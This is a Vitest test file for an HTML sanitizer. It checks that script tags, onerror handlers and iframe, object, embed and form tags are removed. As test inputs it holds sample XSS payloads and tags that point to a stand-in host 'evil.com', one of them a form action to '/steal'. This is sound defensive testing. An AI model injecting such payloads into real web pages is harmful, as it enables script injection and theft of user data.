import { describe, it, expect } from 'vitest'
import { sanitizeHTML, sanitizeText } from './sanitize'

describe('sanitizeHTML', () => {
  it('allows safe HTML tags', () => {
    const input = '<p>Hello <strong>world</strong></p>'
    const result = sanitizeHTML(input)
    expect(result).toContain('<strong>world</strong>')
    expect(result).not.toContain('<script>')
  })

  it('removes script tags', () => {
    const input = '<script>alert("xss")</script><p>Hello</p>'
    const result = sanitizeHTML(input)
    expect(result).not.toContain('<script>')
    expect(result).not.toContain('alert')
    expect(result).toContain('<p>Hello</p>')
  })

  it('removes inline event handlers like onerror', () => {
    const input = '<img src=x onerror=alert(1)>'
    const result = sanitizeHTML(input)
    expect(result).not.toContain('onerror')
  })

  // Assert on the tag NAME, not on a literal '<iframe>'. Every real payload
  // carries attributes, so an exact-tag assertion passes on unsanitized input and
  // the case can only fail for a bare tag nobody sends.
  it('forbids iframes', () => {
    const input = '<iframe src="https://evil.com"></iframe><p>content</p>'
    const result = sanitizeHTML(input)
    expect(result).not.toMatch(/<iframe/i)
    expect(result).not.toContain('evil.com')
    expect(result).toContain('<p>content</p>')
  })

  // The remaining forbidden tags carry attributes too, and none of them was
  // covered at all, so the same regression would have gone equally unnoticed.
  it.each([
    ['object', '<object data="https://evil.com/x.swf"></object>'],
    ['embed', '<embed src="https://evil.com/x.swf">'],
    ['form', '<form action="https://evil.com/steal"><input name="p"></form>'],
    ['script', '<script src="https://evil.com/x.js"></script>'],
  ])('forbids %s even with attributes', (tag, payload) => {
    const result = sanitizeHTML(payload + '<p>content</p>')
    expect(result).not.toMatch(new RegExp('<' + tag, 'i'))
    expect(result).not.toContain('evil.com')
    expect(result).toContain('<p>content</p>')
  })

  it('allows links with target attribute', () => {
    const input = '<a href="https://example.com" target="_blank">Link</a>'
    const result = sanitizeHTML(input)
    expect(result).toContain('target="_blank"')
    expect(result).toContain('https://example.com')
  })
})

describe('sanitizeText', () => {
  it('strips all HTML tags', () => {
    const input = '<p>Hello <strong>world</strong></p>'
    const result = sanitizeText(input)
    expect(result).toBe('Hello world')
  })

  it('removes script content', () => {
    const input = '<script>doEvil()</script>Safe text'
    const result = sanitizeText(input)
    expect(result).not.toContain('<script>')
    expect(result).not.toContain('doEvil')
    expect(result).toContain('Safe text')
  })

  it('returns plain text unchanged', () => {
    const input = 'Plain text without HTML'
    const result = sanitizeText(input)
    expect(result).toBe('Plain text without HTML')
  })
})
